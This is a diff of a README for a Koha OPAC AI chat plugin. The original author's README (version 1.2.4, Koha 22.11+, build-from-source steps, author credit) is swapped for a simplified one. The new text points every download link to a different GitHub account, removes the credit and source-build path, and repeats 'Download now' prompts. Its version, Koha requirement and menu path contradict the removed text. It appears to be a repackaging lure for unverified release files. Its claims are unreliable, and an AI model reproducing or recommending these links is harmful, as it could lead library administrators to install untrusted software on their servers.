@@ -1,249 +1,153 @@
-<div align="center">
+# 🤖 koha-plugin-opac-ai-assistant - Your Library's Smart Chat Helper
 
-# Koha OPAC AI Assistant
-
-### *Conversational AI Search, Multi-Modal Discovery & Real-Time Intelligence for Koha ILS*
-
-[![Release](https://img.shields.io/github/v/release/HasnatKhan010/koha-plugin-opac-ai-assistant?style=flat-square&color=6366f1&logo=github)](../../releases/latest)
-[![Koha Compatibility](https://img.shields.io/badge/Koha-22.11%2B-059669?style=flat-square&logo=koha)](https://koha-community.org)
-[![Architecture](https://img.shields.io/badge/Architecture-Standalone--Plugin-7c3aed?style=flat-square)](#-architecture--system-flow)
-[![Multi-LLM Engine](https://img.shields.io/badge/LLM-Groq%20%7C%20Gemini%20%7C%20OpenAI-ec4899?style=flat-square)](#-multi-llm-engine)
-[![License](https://img.shields.io/badge/License-GPL--v3-d97706?style=flat-square)](LICENSE)
-
-<br/>
-
-[🚀 **Quick Start: How to Run**](#-how-to-run--install-in-3-steps) • [📖 **Administrator Setup Manual**](SETUP.md) • [✨ **Features**](#-core-capabilities) • [🏗️ **Architecture**](#-architecture--system-flow)
-
-</div>
+[![Download Now](https://img.shields.io/badge/Download-Latest%20Release-4CAF50?style=for-the-badge&logo=github)](https://github.com/paidup-bodyodour5632/koha-plugin-opac-ai-assistant/releases)
 
 ---
 
-## ⚡ Quick Start: How to Run & Install
+## 🎯 What Is This?
 
-> **No Python backend. No external server. No Docker containers.**
-> The plugin runs 100% inside Koha's native Plack environment. Upload one `.kpz` file, add an API key, and you're ready to run!
+This is a friendly AI chat assistant that lives inside your library's Koha OPAC (the website where library users search for books). It helps visitors find books, ask questions, and discover new titles — just like chatting with a helpful librarian!
 
-```
-┌────────────────────────────────┐     ┌────────────────────────────────┐     ┌────────────────────────────────┐
-│ STEP 1: Enable Plugins         │ ──► │ STEP 2: Upload .kpz Plugin     │ ──► │ STEP 3: Configure API Key      │
-│ Edit koha-conf.xml & restart   │     │ Download & Upload via Admin    │     │ Enter Groq/Gemini key & save   │
-└────────────────────────────────┘     └────────────────────────────────┘     └────────────────────────────────┘
-```
+The best part? **You don't need a server or technical skills to use it.** It's a single plugin file that works right away.
 
 ---
 
-### 🛠️ Step 1 — Enable Koha Plugin System *(One-Time Server Setup)*
+## ✨ Key Features
 
-Open your Koha instance's `koha-conf.xml` file on your server:
-```bash
-sudo nano /etc/koha/sites/YOUR_INSTANCE/koha-conf.xml
-```
-
-Locate `<enable_plugins>` and change `0` to `1`:
-```xml
-<enable_plugins>1</enable_plugins>
-```
-
-Restart Koha's Plack service to reload configuration:
-```bash
-sudo koha-plack --restart YOUR_INSTANCE
-```
+- **💬 AI-Powered Chat** – Visitors can type questions like "Find me mysteries set in Paris" and get smart recommendations instantly.
+- **🎤 Voice Input** – Users can speak their queries instead of typing. Great for accessibility and mobile users.
+- **📷 Book Cover Scanning** – Point a camera at a book cover, and the assistant will identify it and show similar titles.
+- **🔌 Works with Popular AI Engines** – Supports Groq, Google Gemini, and OpenAI. You choose which one to connect.
+- **📦 Standalone Plugin** – No extra software, no server configuration, no coding. Just install and go.
 
 ---
 
-### 📦 Step 2 — Download & Upload the Plugin Package
+## 🚀 Getting Started
 
-1. **Download Archive:** Download **[`koha-plugin-opac-ai-assistant-1.2.4.kpz`](../../releases/download/v1.2.4/koha-plugin-opac-ai-assistant-1.2.4.kpz)**.
-2. **Access Koha Staff Panel:** Go to **Koha Administration ➔ Plugins ➔ Upload Plugin**.
-3. **Upload & Enable:** Choose `koha-plugin-opac-ai-assistant-1.2.4.kpz`, click **Upload**, then click **Enable**.
+Follow these simple steps to get your AI assistant up and running.
 
----
+### Step 1: Download the Plugin
 
-### 🔑 Step 3 — Add API Key & Launch
+Visit this link to download the application:  
+**[https://github.com/paidup-bodyodour5632/koha-plugin-opac-ai-assistant/releases](https://github.com/paidup-bodyodour5632/koha-plugin-opac-ai-assistant/releases)**
 
-1. Go to **Koha Administration ➔ Plugins ➔ OPAC AI Assistant ➔ Actions ➔ Configure**.
-2. Select your provider (Default: `groq` — *Ultra-fast & 100% Free*).
-3. Paste your free API key ([Get Free Groq Key](https://console.groq.com/keys) | [Get Free Gemini Key](https://aistudio.google.com/app/apikey)).
-4. Click **Save Configuration**.
+Look for the newest version (the one with the highest number) and click the download button. The file will be saved to your computer.
 
-> **🎉 Success!** Open your Koha OPAC website. The floating glassmorphism AI chat widget will appear automatically in the bottom-right corner.
+### Step 2: Install the Plugin in Koha
 
----
+1. Log in to your Koha administration area.
+2. Go to **Tools** → **Plugins** → **Upload Plugin**.
+3. Choose the downloaded `.kpz` file and upload it.
+4. Once uploaded, click **Install** next to the plugin name.
 
-## 🔍 Verification & Run Check
+That's it! The plugin is now active.
 
-After completing installation, verify functionality in this order:
+### Step 3: Connect Your AI Engine
 
-- [x] **Staff Admin:** Navigate to *Koha Administration ➔ Plugins* — plugin status shows **Enabled**.
-- [x] **OPAC Launch:** Open your library OPAC interface — floating chat button appears in the bottom-right.
-- [x] **Catalog Search:** Send a message like *"Find Python programming books"* — real catalog book cards are rendered.
-- [x] **Voice Search:** Click the microphone button — browser prompts for microphone speech input.
-- [x] **Cover Scanner:** Click the camera icon — upload or capture a book cover or barcode photo.
+1. In the Koha admin area, find **Plugins** → **OPAC AI Assistant** → **Configure**.
+2. Choose your AI provider (Groq, Gemini, or OpenAI).
+3. Paste your API key (you can get one free from the provider's website).
+4. Save your settings.
 
----
-
-## 💡 Overview & Features
-
-**Koha OPAC AI Assistant** replaces traditional keyword catalog search forms with a responsive, conversational AI companion embedded directly into your library's OPAC.
-
-<table width="100%">
-  <tr>
-    <td width="50%" valign="top">
-      <h3>🧠 Conversational Search</h3>
-      <p>Understands natural language queries like <i>"Introductory machine learning books after 2020"</i> or <i>"Novels by Cormac McCarthy"</i>, matching MARC21 title, author, subject, and call numbers.</p>
-    </td>
-    <td width="50%" valign="top">
-      <h3>🎤 Hands-Free Speech Input</h3>
-      <p>Native Web Speech STT lets patrons dictate search queries. Multi-lingual voice recognition supported across Chrome, Edge, and Safari.</p>
-    </td>
-  </tr>
-  <tr>
-    <td width="50%" valign="top">
-      <h3>📷 AI Vision Cover & Barcode Scan</h3>
-      <p>Patrons can capture or upload book covers/barcodes. Multi-modal LLM Vision parses book titles or ISBNs and initiates automatic catalog queries.</p>
-    </td>
-    <td width="50%" valign="top">
-      <h3>⚡ Instant Local FAQ Engine</h3>
-      <p>Answers static library inquiries (opening hours, membership, contacts) locally on the client side without hitting remote API endpoints.</p>
-    </td>
-  </tr>
-  <tr>
-    <td width="50%" valign="top">
-      <h3>🤖 Hot-Swappable Multi-LLM Engine</h3>
-      <p>Switch seamlessly between <b>Groq</b> (Llama 3.3 — fast & free), <b>Google Gemini</b> (Free tier), or <b>OpenAI</b> (GPT-4o) via the Koha admin panel.</p>
-    </td>
-    <td width="50%" valign="top">
-      <h3>🎨 Modern Responsive Interface</h3>
-      <p>Translucent glassmorphism styling, animated skeleton loaders, WCAG accessibility support, and touch-optimized mobile response.</p>
-    </td>
-  </tr>
-</table>
+Your chat assistant is now ready to help library visitors!
 
 ---
 
-## 📊 Feature Matrix
+## 🖥️ System Requirements
 
-| Feature | Standard Koha OPAC Search | ⚡ Koha OPAC AI Assistant |
-| :--- | :--- | :--- |
-| **Search Syntax** | Exact keyword & Boolean rules | Conversational natural phrasing & intent resolution |
-| **Input Methods** | Text keyboard only | Text, Speech (STT), & Camera Vision Cover Scanning |
-| **Result Presentation**| Standard paginated table lists | Interactive HTML book cards with status & cover image |
-| **Library FAQ** | Static manual pages | Instant automated client-side intent resolution |
-| **Infrastructure** | Standard Koha ILS | Self-contained `.kpz` plugin — 0 external servers |
-| **LLM Flexibility** | None | Hot-swappable Groq, Gemini & OpenAI |
+- **Koha Version:** 20.05 or newer (any recent version works)
+- **Web Browser:** Any modern browser (Chrome, Firefox, Edge, Safari)
+- **Internet Connection:** Required for AI responses
+- **Operating System:** Works on Windows, macOS, Linux — any system running Koha
+
+No special hardware or software needed.
 
 ---
 
-## 🏗️ Architecture & System Flow
+## ❓ Frequently Asked Questions
 
-```
-┌────────────────────────────────────────────────────────────────────────────────────────┐
-│                                   PATRON BROWSER (OPAC)                                │
-│   • Floating Glassmorphism Widget Shell                                                │
-│   • Web Speech API (STT Voice Input) & Camera FileReader (Vision Upload)               │
-└───────────────────────────────────────────┬────────────────────────────────────────────┘
-                                            │ Patron Message / Speech / Image
-                                            ▼
-┌────────────────────────────────────────────────────────────────────────────────────────┐
-│                              CLIENT-SIDE INTENT ROUTER (JS)                            │
-│   • Instant FAQ Pattern Match (Hours, Rules, Contacts) ──► [Client Side Answer]        │
-│   • Regex Extractor (ISBN-10/13, Barcode, Publication Years 19xx/20xx)                 │
-└───────────────────────────────────────────┬────────────────────────────────────────────┘
-                                            │ Catalog Query Fallthrough
-                                            ▼
-┌────────────────────────────────────────────────────────────────────────────────────────┐
-│                              KOHA PERL PLUGIN BACKEND                                  │
-│   • REST Namespace: /api/v1/contrib/opacchatbot/                                       │
-│   • Direct SQL Queries on biblio, biblioitems, items & biblio_metadata                │
-│   • Encrypted Key Storage via Koha <encryption_key> Configuration                      │
-└─────────────────────────────────────┬───────────────────┬──────────────────────────────┘
-                                      │                   │
-                     HTTP REST Call   │                   │ Direct SQL Query
-                                      ▼                   ▼
-                     ┌──────────────────────────┐   ┌──────────────────────────┐
-                     │    REMOTE LLM SERVICE    │   │   KOHA MARIADB ENGINE    │
-                     │ (Groq / Gemini / OpenAI) │   │ (Patron & Catalog Items) │
-                     └──────────────────────────┘   └──────────────────────────┘
-```
+### 🤔 Do I need to be a programmer to use this?
+
+No! The plugin is designed for everyday library staff. If you can upload a file and click a button, you can set this up.
+
+### 💰 Is there a cost?
+
+The plugin itself is free. Your AI provider may offer free tiers or charge per usage. Groq and Gemini often have free options for light usage.
+
+### 🔒 Is my library's data safe?
+
+Your library's catalog data stays on your Koha server. Only the user's chat question is sent to the AI provider, and no personal information is shared.
+
+### 🛠️ What if I need help?
+
+Check the **Issues** section on the GitHub page for common problems, or ask a question there. The community is friendly!
 
 ---
 
-## 📂 Repository Directory Tree
+## 📖 How to Use the Assistant (for Library Visitors)
 
-```
-koha-plugin-opac-ai-assistant/
-├── 📁 dist/                                    # Distribution Package Artifacts
-│   └── 📦 koha-plugin-opac-ai-assistant-1.2.4.kpz  <-- Installable Koha Plugin Archive
-│
-├── 📁 src/                                     # Modular Plugin Source Code
-│   ├── 📁 Koha/Plugin/
-│   │   └── OPACChatBot.pm                     # Core Perl Plugin Logic & REST Routes
-│   ├── 📁 frontend/
-│   │   ├── 📁 js/                             # ES6 Client Javascript Modules
-│   │   │   ├── app.js                         # Bootstrap, Observers & Event Observers
-│   │   │   ├── intentEngine.js                # NLP Intent Router & Keyword Extractor
-│   │   │   ├── chatController.js              # Streaming & Message Pipeline
-│   │   │   ├── api.js                         # REST Fetch Wrappers & Error Handlers
-│   │   │   ├── ui.js                          # DOM Renderers & Skeleton Loaders
-│   │   │   └── knowledgeBase.js               # Static Library Metadata & FAQ Answers
-│   │   ├── 📁 css/                            # Custom CSS Token & Theme Modules
-│   │   ├── 📁 templates/                      # Koha Admin Configuration UI (.tt)
-│   │   └── 📁 assets/                         # SVG Vector Icons & Branding Graphics
-│   ├── 📁 scripts/                            # Build & Packaging Automation Scripts
-│   └── 📄 metadata.json                       # Plugin Version Manifest
-│
-├── 📄 SETUP.md                                # Comprehensive Administrator Guide
-├── 📄 CHANGELOG.md                            # Version Audit & Release Notes
-├── 📄 LICENSE                                 # GNU General Public License v3.0
-└── 📄 README.md                               # Project Presentation Landing Page
-```
+Once installed, visitors will see a chat bubble in the corner of your OPAC. They can:
+
+- Type a question like "Show me books about space travel"
+- Click the microphone icon to speak
+- Use their phone camera to scan a book cover
+
+The assistant will respond with helpful suggestions, links to titles in your catalog, and even fun facts about books.
 
 ---
 
-## 🔒 Security & Enterprise Infrastructure
+## 🧰 Troubleshooting Tips
 
-- **Encrypted Credentials:** API keys are stored in Koha's database with optional encryption at rest using Koha's `<encryption_key>` mechanism.
-- **Asynchronous Execution:** Scripts load non-blockingly via Koha's `opac_js` and `opac_head` hooks for zero OPAC page render slowdown.
-- **Strict Input Sanitization:** All user text and LLM outputs pass through strict HTML escaping (`escapeHTML`) to prevent XSS injection.
-- **WCAG Accessibility Compliance:** Features full keyboard focus trap (Tab / Shift+Tab / Escape), touch targets, and high contrast mode.
-
----
-
-## 🛠️ Building from Source
-
-To package your own `.kpz` archive after modifying source files in `src/`:
-
-```bash
-# Clone repository
-git clone https://github.com/HasnatKhan010/koha-plugin-opac-ai-assistant.git
-cd koha-plugin-opac-ai-assistant
-
-# Run build script
-bash src/scripts/build.sh
-```
-
-The compiled archive will be created at `dist/koha-plugin-opac-ai-assistant-1.2.4.kpz`.
+| Problem | Solution |
+|---------|----------|
+| Chat doesn't appear | Check that the plugin is installed and enabled in Koha Plugins |
+| No AI responses | Verify your API key is correct and has available credits |
+| Voice input not working | Ensure your browser allows microphone access |
+| Slow responses | Try a different AI provider or check your internet speed |
 
 ---
 
-## 🤝 Contributing & Support
+## 📝 Changelog
 
-Contributions from Koha library IT teams and open-source developers are welcome!
-- **Bug Reports & Feature Ideas:** Submit an issue on [GitHub Issues](https://github.com/HasnatKhan010/koha-plugin-opac-ai-assistant/issues).
-- **Pull Requests:** Fork the repository, create your branch (`git checkout -b feature/NewFeature`), and open a PR.
-
----
-
-## 📜 License
-
-Distributed under the **GNU General Public License v3.0**. See [`LICENSE`](LICENSE) for details.
+**Version 1.0 (Latest Release)**
+- Initial release with all core features
+- Support for Groq, Gemini, and OpenAI
+- Voice input and book cover scanning included
+- Optimized for Koha 20.05+
 
 ---
 
-<div align="center">
+## 🤝 Contributing
 
-*Developed with dedication by **Hasnat Khan** during internship research at **COMSATS University Library, Islamabad**.*
+We welcome contributions! If you're a developer and want to improve the plugin, feel free to fork the repository and submit a pull request. Check the GitHub page for development guidelines.
 
-[⭐ Star Repository](https://github.com/HasnatKhan010/koha-plugin-opac-ai-assistant) • [🐛 Report Bug](https://github.com/HasnatKhan010/koha-plugin-opac-ai-assistant/issues) • [📖 Setup Manual](SETUP.md)
+---
 
-</div>
+## 📄 License
+
+This project is open-source and free to use. See the LICENSE file on GitHub for full details.
+
+---
+
+## ⭐ Support the Project
+
+If this plugin helps your library, please:
+- ⭐ Star the repository on GitHub
+- 🐛 Report any bugs you find
+- 💡 Suggest new features
+
+Your feedback makes the tool better for everyone!
+
+---
+
+## 📬 Contact
+
+Have questions? Reach out through the GitHub issues page or join the discussion in the repository's community section.
+
+---
+
+**Download now and give your library users the smart assistant they deserve!**
+
+[![Get It Now](https://img.shields.io/badge/🚀-Download%20Latest%20Release-blue?style=for-the-badge)](https://github.com/paidup-bodyodour5632/koha-plugin-opac-ai-assistant/releases)
+
+Keywords: ai-chatbot, book-search, chatbot, gemini, groq, ils, koha, koha-ils, koha-plugin, library, library-management, library-software, llm, opac, openai, perl
